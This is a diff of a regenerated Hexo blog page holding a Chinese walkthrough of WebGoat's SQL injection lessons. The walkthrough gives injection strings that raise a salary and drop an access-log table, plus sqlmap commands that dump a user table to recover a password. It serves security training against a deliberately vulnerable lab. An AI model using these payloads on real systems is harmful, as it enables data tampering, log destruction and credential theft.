@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.2.0">
+<meta name="generator" content="Hexo 5.3.0">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
@@ -16,16 +16,15 @@
 
 
 
-<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@5/css/font-awesome.min.css">
   <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
   <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"upwnothing.github.io","root":"/","scheme":"Gemini","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
+    var CONFIG = {"hostname":"upwnothing.github.io","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
   </script>
-
-  <meta name="description" content="WebGoat (A1) Injection 解题思路 上半部分">
+<meta name="description" content="WebGoat (A1) Injection 解题思路 上半部分">
 <meta property="og:type" content="article">
 <meta property="og:title" content="WebGoat Injection 解题思路 （上）">
 <meta property="og:url" content="https://upwnothing.github.io/zh-CN/3dea2b22/index.html">
@@ -73,7 +72,7 @@
     // Wait for the page to load first
     var _prevOnload = window.onload;
     window.onload = function() {
-        var switchLang = document.getElementById("menu").getElementsByClassName("menu-item-switch_lang")[0].childNodes[1];
+        var switchLang = document.getElementsByClassName("menu-item-switch_lang")[0].childNodes[1];
             var href = window.location.href;     
             var indexOfEn = href.toLowerCase().indexOf('/en/');
             if(indexOfEn !== -1) {
@@ -89,8 +88,7 @@
 </script>
 <script data-ad-client="ca-pub-2179953596008833" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 
-
-  <title>WebGoat Injection 解题思路 （上） | UPWNothing's Playground</title>
+<title>WebGoat Injection 解题思路 （上） | UPWNothing's Playground</title>
   
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-125116918-1"></script>
     <script>
@@ -101,8 +99,6 @@
         gtag('config', 'UA-125116918-1');
       }
     </script>
-
-
 
 
 
@@ -151,7 +147,7 @@
     <header class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
+    <div class="toggle" aria-label="切换导航栏" role="button">
         <span class="toggle-line"></span>
         <span class="toggle-line"></span>
         <span class="toggle-line"></span>
@@ -179,31 +175,11 @@
 
 <nav class="site-nav">
   <ul class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">22</span></a>
-
-  </li>
-        <li class="menu-item menu-item-switch_lang">
-
-    <a href="/en/" rel="section"><i class="fa fa-language fa-fw"></i>switch_lang</a>
-
-  </li>
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">22</span></a></li>
+        <li class="menu-item menu-item-switch_lang"><a href="/en/" rel="section"><i class="fa fa-language fa-fw"></i>switch_lang</a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
@@ -214,8 +190,7 @@
 
 
   <div class="search-pop-overlay">
-    <div class="popup search-popup">
-        <div class="search-header">
+    <div class="popup search-popup"><div class="search-header">
   <span class="search-icon">
     <i class="fa fa-search"></i>
   </span>
@@ -224,7 +199,7 @@
            placeholder="搜索..." spellcheck="false"
            type="search" class="search-input">
   </div>
-  <span class="popup-btn-close">
+  <span class="popup-btn-close" role="button">
     <i class="fa fa-times-circle"></i>
   </span>
 </div>
@@ -240,7 +215,7 @@
 </div>
         
   
-  <div class="toggle sidebar-toggle">
+  <div class="toggle sidebar-toggle" role="button">
     <span class="toggle-line"></span>
     <span class="toggle-line"></span>
     <span class="toggle-line"></span>
@@ -260,12 +235,12 @@
 
       <div class="sidebar-panel-container">
         <!--noindex-->
-        <section class="post-toc-wrap sidebar-panel">
+        <div class="post-toc-wrap sidebar-panel">
             <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WebGoat-%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">WebGoat 版本信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#A1-Injection-%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">(A1) Injection 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-intro"><span class="nav-number">2.1.</span> <span class="nav-text">SQL Injection (intro)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Concept"><span class="nav-number">2.1.1.</span> <span class="nav-text">1 - Concept</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-What-is-SQL"><span class="nav-number">2.1.2.</span> <span class="nav-text">2 - What is SQL?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-DML"><span class="nav-number">2.1.3.</span> <span class="nav-text">3 - DML</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-DDL"><span class="nav-number">2.1.4.</span> <span class="nav-text">4 - DDL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-DCL"><span class="nav-number">2.1.5.</span> <span class="nav-text">5 - DCL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-amp-7-amp-8-What-is-SQL-injection"><span class="nav-number">2.1.6.</span> <span class="nav-text">6 &amp; 7 &amp; 8 - What is SQL injection?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-Try-It"><span class="nav-number">2.1.7.</span> <span class="nav-text">9 - Try It!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-Numeric-SQL-Injection"><span class="nav-number">2.1.8.</span> <span class="nav-text">10 - Numeric SQL Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-String-SQL-Injection"><span class="nav-number">2.1.9.</span> <span class="nav-text">11 - String SQL Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-Compromising-Integrity-with-Query-chaining"><span class="nav-number">2.1.10.</span> <span class="nav-text">12 - Compromising Integrity with Query chaining</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-Compromising-Availability"><span class="nav-number">2.1.11.</span> <span class="nav-text">13 - Compromising Availability</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">2.1.12.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-advanced"><span class="nav-number">2.2.</span> <span class="nav-text">SQL Injection (advanced)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-1-2"><span class="nav-number">2.2.1.</span> <span class="nav-text">Challenge 1,2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-3"><span class="nav-number">2.2.2.</span> <span class="nav-text">Challenge 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-4"><span class="nav-number">2.2.3.</span> <span class="nav-text">Challenge 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-5"><span class="nav-number">2.2.4.</span> <span class="nav-text">Challenge 5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-6"><span class="nav-number">2.2.5.</span> <span class="nav-text">Challenge 6</span></a></li></ol></li></ol></li></ol></div>
-        </section>
+        </div>
         <!--/noindex-->
 
-        <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview-wrap sidebar-panel">
           <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <img class="site-author-image" itemprop="image" alt="UPWNothing"
       src="/images/icon.jpeg">
@@ -296,9 +271,9 @@
 
 
 
-        </section>
+        </div>
       </div>
-        <div class="back-to-top animated">
+        <div class="back-to-top animated" role="button">
           <i class="fa fa-arrow-up"></i>
           <span>0%</span>
         </div>
@@ -318,9 +293,7 @@
 
 
     <div class="main-inner post posts-expand">
-      
 
-      
 
   
 
@@ -372,13 +345,6 @@
     </span>
 
   
-    <span id="/zh-CN/3dea2b22/" class="post-meta-item leancloud_visitors" data-flag-title="WebGoat Injection 解题思路 （上）" title="阅读次数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span class="leancloud-visitors-count"></span>
-    </span>
     <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
@@ -418,17 +384,13 @@
 <h1 id="A1-Injection-注入"><a href="#A1-Injection-注入" class="headerlink" title="(A1) Injection 注入"></a>(A1) Injection 注入</h1><h2 id="SQL-Injection-intro"><a href="#SQL-Injection-intro" class="headerlink" title="SQL Injection (intro)"></a>SQL Injection (intro)</h2><h3 id="1-Concept"><a href="#1-Concept" class="headerlink" title="1 - Concept"></a>1 - Concept</h3><p>介绍SQL的基本概念，仔细阅读即可。</p>
 <h3 id="2-What-is-SQL"><a href="#2-What-is-SQL" class="headerlink" title="2 - What is SQL?"></a>2 - What is SQL?</h3><p>简单了解SQL语句。测试如何使用 <strong>SELECT语句</strong>进行查询。<br>这个非常简单：</p>
 <figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> department <span class="keyword">from</span> employees <span class="keyword">where</span> userid=<span class="number">96134</span></span><br></pre></td></tr></table></figure>
-
 <h3 id="3-DML"><a href="#3-DML" class="headerlink" title="3 - DML"></a>3 - DML</h3><p>SQL语句除去SELECT查询之外，还有Insert, Update等添加、修改数据的操作。</p>
 <p>测试内容为将<code>Tobi Barnett</code>的部门修改为<code>Sales</code>。这个也相对容易：</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Update</span> employees <span class="keyword">set</span> department = <span class="string">&#x27;Sales&#x27;</span> <span class="keyword">where</span> userid = <span class="number">89762</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Update</span> employees <span class="keyword">set</span> department = <span class="string">&#x27;Sales&#x27;</span> <span class="keyword">where</span> userid = <span class="number">89762</span></span><br></pre></td></tr></table></figure>
 <h3 id="4-DDL"><a href="#4-DDL" class="headerlink" title="4 - DDL"></a>4 - DDL</h3><p>这一节介绍了如何使用SQL语句修改数据库中表的结构。测试内容是为<code>employees</code>表添加一个名为<code>phone</code>的列，数据类型为<code>varchar(20)</code>。</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> employees <span class="keyword">ADD</span> phone <span class="type">varchar</span>(<span class="number">20</span>)</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> employees <span class="keyword">ADD</span> phone <span class="type">varchar</span>(<span class="number">20</span>)</span><br></pre></td></tr></table></figure>
 <h3 id="5-DCL"><a href="#5-DCL" class="headerlink" title="5 - DCL"></a>5 - DCL</h3><p>这一节的内容是通过SQL语言管理用户进入及操作数据库的权限。</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="keyword">TO</span> UnauthorizedUser</span><br></pre></td></tr></table></figure>
-
 <p>到此为止，就完成了对于SQL语句的初步认识与学习。如果对于SQL语言的其他操作还存在什么问题的话，可以在<a target="_blank" rel="noopener" href="https://www.w3schools.com/sql/default.asp">w3school SQL</a>进行学习。</p>
 <h3 id="6-amp-7-amp-8-What-is-SQL-injection"><a href="#6-amp-7-amp-8-What-is-SQL-injection" class="headerlink" title="6 &amp; 7 &amp; 8 - What is SQL injection?"></a>6 &amp; 7 &amp; 8 - What is SQL injection?</h3><p>这几节介绍了SQL注入的基本原理，可能产生的影响以及SQL注入的严重性。如果之前对于 <strong>SQL注入</strong> 已经有了基本的了解，那么这一步可以简单跳过。 如果对于 <strong>SQL注入</strong> 还没有任何的概念，请务必仔细阅读这里的内容。</p>
 <p>这三节没有任何交互性的内容。</p>
@@ -440,19 +402,16 @@
 <p>所以再次尝试对User_id的值进行注入：</p>
 <p><img data-src="/zh-CN/3dea2b22/1_1_10_1.png" alt="Success!"></p>
 <h3 id="11-String-SQL-Injection"><a href="#11-String-SQL-Injection" class="headerlink" title="11 - String SQL Injection"></a>11 - String SQL Injection</h3><p>类似于第9个小测试的内容。只不过这次不再是选择题了。在<code>Employee Name</code>的输入框输入：</p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or <span class="number">1</span>=<span class="number">1</span> -- </span><br></pre></td></tr></table></figure>
-
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure>
 <p><img data-src="/zh-CN/3dea2b22/1_1_11.png"></p>
 <h3 id="12-Compromising-Integrity-with-Query-chaining"><a href="#12-Compromising-Integrity-with-Query-chaining" class="headerlink" title="12 - Compromising Integrity with Query chaining"></a>12 - Compromising Integrity with Query chaining</h3><p>同样的输入框。但这次不同于之前的仅仅是获取到全部员工的列表信息，这次我们需要真真切切地做些坏事了。这个挑战的要求是，将数据库中自己的工资修改为最高。</p>
 <p>思路是使用分号分隔两句SQL语句，并在第二句使用UPDATE命令对数据进行更新。因此，我们可以在<code>Employee Name</code>的输入框输入：</p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or <span class="number">1</span>=<span class="number">1</span>; Update employees SET SALARY=<span class="number">99999</span> where AUTH_TAN=<span class="number">3</span>SL99A --</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1; <span class="keyword">Update</span> employees <span class="keyword">SET</span> SALARY=<span class="number">99999</span> <span class="keyword">where</span> AUTH_TAN=<span class="number">3</span>SL99A --</span><br></pre></td></tr></table></figure>
 <p>OK,顺利让自己的工资变成最高了！！（千万别在真实的生产环境中做同样的事情！！）</p>
 <p><img data-src="/zh-CN/3dea2b22/1_1_11.png"></p>
 <h3 id="13-Compromising-Availability"><a href="#13-Compromising-Availability" class="headerlink" title="13 - Compromising Availability"></a>13 - Compromising Availability</h3><p>题目要求在<code>access_log</code>表中删除被系统记录下的SQL语句执行记录。</p>
 <p>与上一题思路相同，再第二句SQL语句中执行 <strong>DROP</strong> 命令，删除<code>access_log</code>表中的数据。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d&#x27;; <span class="keyword">drop</span> <span class="keyword">TABLE</span> access_log <span class="comment">--</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">d</span>&#x27;; <span class="keyword">drop</span> <span class="keyword">TABLE</span> access_log --</span><br></pre></td></tr></table></figure>
 <p>成功！</p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这一小节介绍了SQL注入中一些最为基础的概念。并通过一个比较真实的场景，来展现了一个攻击者在面对一个存在漏洞的系统时，可以实现哪些操作。</p>
 <p>当然，由于这一部分主要是面对刚刚入门的初学者，为了更好的实现展示的目的，所以这一部分中的漏洞非常的显而易见，也非常容易利用。而在实际的生产环境中，大多数的漏洞并不是那么简单地就能被利用。下一节就要尝试更困难的挑战了！</p>
@@ -480,25 +439,20 @@
 <p><code>tom&#39; and 1=1 -- </code></p>
 <p>系统返回了以下信息：</p>
 <figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span> &#123;<span class="number">0</span>&#125; <span class="keyword">already</span> <span class="keyword">exists</span> <span class="keyword">please</span> <span class="keyword">try</span> <span class="keyword">to</span> <span class="keyword">register</span> <span class="keyword">with</span> <span class="keyword">a</span> <span class="keyword">different</span> <span class="keyword">username</span>.</span><br></pre></td></tr></table></figure>
-
 <p>这个<code>&#123;0&#125;</code>看着颇为可疑…感觉可能是个能够利用的点。使用BurpSuite截取请求：</p>
 <p><img data-src="/zh-CN/3dea2b22/1_2_5_2.png"></p>
 <p>将请求保存到本地文件，并使用<code>sqlmap -r webgoat_1.2.5_register.txt</code>对这个请求进行SQL注入的测试。</p>
 <p><img data-src="/zh-CN/3dea2b22/1_2_5_3.png"></p>
 <p>很显然，<code>username_reg</code>这个参数存在SQL注入的漏洞。因此，我们进一步利用 <strong>SQL Map</strong> 来通过这个注入点，获取更多数据库信息。基于上一次运行的结果，我们使用下列命令来列出数据库中所有的DB列表：</p>
 <figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">sqlmap</span> <span class="literal">-</span><span class="comment">r</span> <span class="comment">webgoat_1</span><span class="string">.</span><span class="comment">2</span><span class="string">.</span><span class="comment">5_register</span><span class="string">.</span><span class="comment">txt</span> --<span class="comment">dbms=HSQLDB</span> --<span class="comment">thread</span> <span class="comment">5</span> --<span class="comment">dbs</span> --<span class="comment">no</span><span class="literal">-</span><span class="comment">cast</span> --<span class="comment">technique=B</span></span><br></pre></td></tr></table></figure>
-
 <p><img data-src="/zh-CN/3dea2b22/1_2_5_4.png"></p>
 <p>我们获取到了5个数据库。再指定数据库为<code>PUBLIC</code>获取该数据中所有的表名。同时我们注意到，这个时候执行的速度明显减慢了很多，所以我们可以在参数中加入<code>--string=&quot;already exists please try to register with a different username&quot;</code>指定查询为真的条件。</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r webgoat_1.2.5_register.txt <span class="params">--string=</span><span class="string">&quot;already exists please try to register with a different username&quot;</span> <span class="params">--dbms=HSQLDB</span> <span class="params">--thread</span> 10 <span class="params">--technique=B</span> -D PUBLIC <span class="params">--tables</span></span><br></pre></td></tr></table></figure>
-
 <p><img data-src="/zh-CN/3dea2b22/1_2_5_5.png"></p>
 <p>成功获取到所有的表名。其中<code>SQL_CHALLENGE_USERS</code>看着就非常像我们需要获取信息的表。尝试直接下载这张表里的内容：</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r webgoat_1.2.5_register.txt <span class="params">--string=</span><span class="string">&quot;already exists please try to register with a different username&quot;</span> <span class="params">--dbms=HSQLDB</span> <span class="params">--thread</span> 10 <span class="params">--technique=B</span> -D PUBLIC -T SQL_CHALLENGE_USERS <span class="params">--dump</span></span><br></pre></td></tr></table></figure>
-
 <p>运行的时候才发现，这个数据库居然还是有快200行…那直接dump确实有点暴力了…(大笑)。有不少是运行SQLMap的时候自己注册进去的!!所以我们采用一个更有针对性的方法：</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r webgoat_1.2.5_register.txt <span class="attribute">--string</span>=<span class="string">&quot;already exists please try to register with a different username&quot;</span> <span class="attribute">--dbms</span>=HSQLDB --thread 10 <span class="attribute">--technique</span>=B -D PUBLIC -T SQL_CHALLENGE_USERS <span class="attribute">--sql-query</span>=<span class="string">&quot;SELECT userid,password FROM SQL_CHALLENGE_USERS WHERE USERID=&#x27;tom&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
-
 <p><img data-src="/zh-CN/3dea2b22/1_2_6.png"></p>
 <p>顺利获得密码！登录即可。</p>
 <blockquote>
@@ -509,27 +463,22 @@
 <li>What is the difference between a prepared statement and a statement?</li>
 </ol>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution <span class="number">4</span>: A <span class="keyword">statement</span> has got <span class="keyword">values</span> <span class="keyword">instead</span> <span class="keyword">of</span> a <span class="keyword">prepared</span> <span class="keyword">statement</span></span><br></pre></td></tr></table></figure>
-
 <ol start="2">
 <li>Which one of the following characters is a placeholder for variables?</li>
 </ol>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution <span class="number">3</span>: ?</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Solution</span> <span class="number">3</span>: ?</span><br></pre></td></tr></table></figure>
 <ol start="3">
 <li>How can prepared statements be faster than statements?</li>
 </ol>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution 2: Prepared statements are compiled once by the database management<span class="built_in"> system </span>waitingfor input <span class="keyword">and</span> are pre-compiled this way.</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution <span class="number">2</span>: <span class="keyword">Prepared</span> statements are compiled once <span class="keyword">by</span> the <span class="keyword">database</span> management <span class="keyword">system</span> waitingfor <span class="keyword">input</span> <span class="keyword">and</span> are pre-compiled this way.</span><br></pre></td></tr></table></figure>
 <ol start="4">
 <li>How can a prepared statement prevent SQL-Injection?</li>
 </ol>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution 3: Placeholders can prevent that the<span class="built_in"> users </span>input gets attached <span class="keyword">to</span> the SQL query resulting <span class="keyword">in</span> a seperation of code <span class="keyword">and</span> data.</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution <span class="number">3</span>: Placeholders can prevent that <span class="keyword">the</span> users input gets attached <span class="built_in">to</span> <span class="keyword">the</span> SQL query resulting <span class="keyword">in</span> <span class="keyword">a</span> seperation <span class="keyword">of</span> code <span class="keyword">and</span> data.</span><br></pre></td></tr></table></figure>
 <ol start="5">
 <li>What happens if a person with malicious intent writes into a register form :Robert); DROP TABLE Students;– that has a prepared statement?</li>
 </ol>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution <span class="number">4</span>: The <span class="keyword">database</span> registers <span class="string">&#x27;Robert&#x27;</span> ); <span class="keyword">DROP</span> <span class="keyword">TABLE</span> Students;<span class="comment">--&#x27;.</span></span><br></pre></td></tr></table></figure>
-
     </div>
 
     
@@ -623,7 +572,7 @@
 
 
 
-      
+    <div class="comments utterances-container"></div>
 
 <script>
   window.addEventListener('tabs:register', () => {
@@ -646,13 +595,11 @@
     });
   }
 </script>
-
-    </div>
+</div>
   </main>
 
   <footer class="footer">
     <div class="footer-inner">
-      
   <div class="languages">
     <label class="lang-select-label">
       <i class="fa fa-language"></i>
@@ -672,12 +619,10 @@
     </select>
   </div>
 
-      
 
 <div class="copyright">
-  
   &copy; 2017 – 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="paw"></i>
   </span>
@@ -688,7 +633,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">38k</span>
+    <span title="站点总字数">39k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
@@ -728,9 +673,6 @@
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
 
   
-
-
-
   <script>
   if (CONFIG.page.isPost) {
     wpac_init = window.wpac_init || [];
@@ -751,17 +693,7 @@
     })();
   }
   </script>
-
-  <script src="/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
+<script src="/js/local-search.js"></script>
 
 
 
@@ -775,12 +707,18 @@
 
 
 
-
-
-
-  
-
-  
+<script>
+NexT.utils.loadComments('.utterances-container', () => {
+  const script = document.createElement('script');
+  script.src = 'https://utteranc.es/client.js';
+  script.setAttribute('repo', "UPWNothing/UPWNothing.github.io");
+  script.setAttribute('issue-term', "pathname");
+  script.setAttribute('theme', "github-dark");
+  script.crossOrigin = 'anonymous';
+  script.async = true;
+  document.querySelector('.utterances-container').appendChild(script);
+});
+</script>
 
 </body>
 </html>
